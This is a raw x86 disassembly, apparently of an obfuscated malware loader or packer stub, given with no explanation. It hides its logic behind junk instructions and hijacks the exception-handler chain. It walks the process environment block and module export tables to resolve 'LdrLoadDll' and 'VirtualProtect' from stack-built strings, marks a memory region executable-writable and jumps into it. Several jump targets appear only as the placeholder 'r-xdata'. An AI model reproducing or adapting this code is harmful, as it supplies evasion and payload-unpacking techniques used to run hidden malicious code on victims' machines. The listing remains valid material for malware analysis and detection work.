_start
pushad
xor edi edi
push esp
or eax eax
sbb edi 0xffffffff
add esp 0x4
mov ecx [ esp - 0x4 ]
inc edi
sub ecx 0x4
inc edi
neg edi
call $+5
sub [ ecx ] edi
retn
sub_56a0202b
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
test ecx ecx
sbb esp 0xfffffffc
mov eax 0x0
or eax edx
add al 0xff
add ax 0xffff
mov ah al
xor ecx ecx
add ecx edx
call $+5
and esi 0x0
add esi [ esp ]
or edi edi
sbb ecx 0xffffffff
movzx ebx [ esi + ecx - 0x2 ]
add esp 0xfffffffc
mov [ esp ] ebx
sub ebx eax
pop ebx
jne r-xdata
add [ esp ] edx
jmp [ esp ]
and edx 0x0
or edx ecx
sub_56a020bf
push [ fs : 0x0 ]
add ebx ecx
xor edx edx
add edx 0xffff
not eax
add ebx ecx
mov [ fs : 0x0 ] esp
and ebx eax
add ebx ecx
jmp r-xdata
call $+5
pop edi
push [ esp ]
pop edi
mov [ fs : 0x0 ] edi
add esp 0x8
mov ecx 0x0
sub ecx ebx
neg ecx
sub edi edi
add edi [ ebx + 0x3c ]
and ecx ecx
adc ebx edi
mov edi 0x4550
push [ ebx ]
pop esi
add esp 0xfffffffc
mov [ esp ] esi
and esi esi
sbb esi edi
pop esi
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
add eax 0x1
retn 0xc
test ebx ebx
mov edi 0x0
adc edi [ ebx + 0x78 ]
mov ebx 0x0
sub ebx edi
neg ebx
and ecx ecx
adc ebx ecx
sub esp 0x4
mov [ esp ] ebx
and edi 0x0
add edi [ ebx + 0x20 ]
xor ebx ebx
add ebx edi
and ecx ecx
adc ebx ecx
add esp 0xfffffffc
mov [ esp ] ecx
push ebx
pop esi
pop ebx
xor edx edx
xor eax eax
xor eax esi
and ecx 0x0
add ecx [ esi ]
and eax eax
mov esi 0x0
adc esi ecx
call $+5
xor ebp ebp
xor ebp esp
add esi ebx
add esp 0xfffffffc
mov [ esp ] 0x6c6c
sub esp 0x4
mov [ esp ] 0x4464616f
add esp 0xfffffffc
mov [ esp ] 0x4c72644c
xor edi edi
or edi esp
push 0xb
pop ecx
[ esi ] [ edi ]
je r-xdata
test ecx ecx
sbb ebx ecx
push edi
xor edi [ esp ]
add esp 0x4
mov edi [ ebx ]
xor esi esi
or esi 0x5a4d
and edi edx
push edi
sub edi esi
pop edi
je r-xdata
and eax eax
mov esp 0x0
adc esp ebp
add esp 0x4
mov esi [ esp - 0x4 ]
push ebx
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov eax [ esp - 0x4 ]
add esp 0x4
mov ecx [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
and edx 0x0
or edx ebx
mov edi 0x0
add edi [ ebx + 0x24 ]
mov ebx 0x0
or ebx edi
add ebx ecx
and edi 0x0
or edi [ ebx + eax * 2 ]
and edi 0xffff
xor eax eax
add eax edi
or ebx ebx
mov edi 0x0
adc edi [ edx + 0x10 ]
sub eax edi
inc eax
test eax eax
mov ebx 0x0
adc ebx [ edx + 0x1c ]
add ebx ecx
mov edi 0x0
or edi [ ebx + eax * 4 ]
and edx edx
adc ecx edi
xor ebp ebp
xor ebp esp
add esp 0xfffffffc
mov [ esp ] edi
xor edi [ esp ]
test esi esi
adc esp 0x4
push edi
mov ebx 0x0
xor ebx esp
push edi
call $+5
mov [ esp ] 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
push 0x6c0065
sub esp 0x4
mov [ esp ] 0x6e0072
call $+5
mov [ esp ] 0x65006b
push esp
push 0x1a0018
mov esi 0x0
add esi esp
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] esi
push edi
push edi
call $+5
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] ebx
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
call ebx
xor eax eax
or eax [ esi ]
sub esp 0x4
mov [ esp ] eax
add esp 0x4
mov edi [ esp - 0x4 ]
mov esi 0x0
add esi [ fs : 0x30 ]
mov ecx 0x0
xor ecx [ esi + 0x10 ]
mov [ ecx + 0x18 ] edi
push ebp
pop esp
push [ fs : 0x30 ]
pop esi
xor ecx ecx
or ecx [ esi + 0x10 ]
mov ebx [ ecx + 0x18 ]
and ecx 0x0
or ecx ebx
mov edi [ ebx + 0x3c ]
test esi esi
adc ebx edi
and edi 0x0
or edi [ ebx + 0x78 ]
xor ebx ebx
add ebx edi
add ebx ecx
sub esp 0x4
mov [ esp ] ebx
mov edi 0x0
add edi [ ebx + 0x20 ]
xor ebx ebx
xor ebx edi
and edx edx
adc ebx ecx
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] ebx
mov esi [ esp ]
add esp 0x4
pop ebx
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
or esi esi
adc esp 0x4
and eax 0x0
or eax esi
mov ecx 0x0
or ecx [ esi ]
test ecx ecx
mov esi 0x0
adc esi ecx
call $+5
mov ebp 0x0
or ebp esp
add esi ebx
add esp 0xfffffffc
mov [ esp ] 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
call $+5
mov [ esp ] 0x506c6175
push 0x74726956
xor edi edi
add edi esp
test eax eax
mov ecx 0x0
adc ecx 0xf
[ esi ] [ edi ]
je r-xdata
sub edx 0xffffffff
test edx edx
adc eax 0x4
mov esi 0x0
xor esi [ eax ]
and esp 0x0
add esp ebp
jmp [ esp ]
mov esp ebp
mov esi [ esp ]
add esp 0x4
call $+5
mov [ esp ] ebx
call $+5
mov [ esp ] edx
add esp 0x4
mov eax [ esp - 0x4 ]
pop ecx
mov ebx [ esp ]
add esp 0x4
and edx 0x0
or edx ebx
and edx edx
mov edi 0x0
adc edi [ ebx + 0x24 ]
xor ebx ebx
add ebx edi
add ebx ecx
xor edi edi
add edi [ ebx + eax * 2 ]
and edi 0xffff
mov eax 0x0
xor eax edi
mov edi 0x0
add edi [ edx + 0x10 ]
test eax eax
sbb eax edi
and esi esi
adc eax 0x1
xor ebx ebx
xor ebx [ edx + 0x1c ]
add ebx ecx
sub edi edi
add edi [ ebx + eax * 4 ]
and ebx ebx
adc ecx edi
mov edx 0x0
or edx 0x1000
call $+5
pop ebx
and ebx 0xfffff000
or edx edx
adc ebx edx
or ebx ebx
adc ebx edx
push ebx
and esi 0x0
add esi 0x4
call $+5
or eax eax
adc ebx edx
xor edi edi
or edi [ ebx ]
sub esi 0x1
je r-xdata
inc edx
add eax 0x4
and esi 0x0
add esi [ eax ]
and esp 0x0
add esp ebp
jmp [ esp ]
add esp 0x4
mov edi [ esp - 0x4 ]
pop ebx
call $+5
mov [ esp ] edi
push esp
call $+5
mov [ esp ] 0x40
sub esp 0x4
mov [ esp ] 0x45c8
sub esp 0x4
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] ebx
mov esi [ esp ]
add esp 0x4
pop ebx
call $+5
pop eax
add eax 0x1a
add esp 0xfffffffc
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ebp
and ebp 0x0
or ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
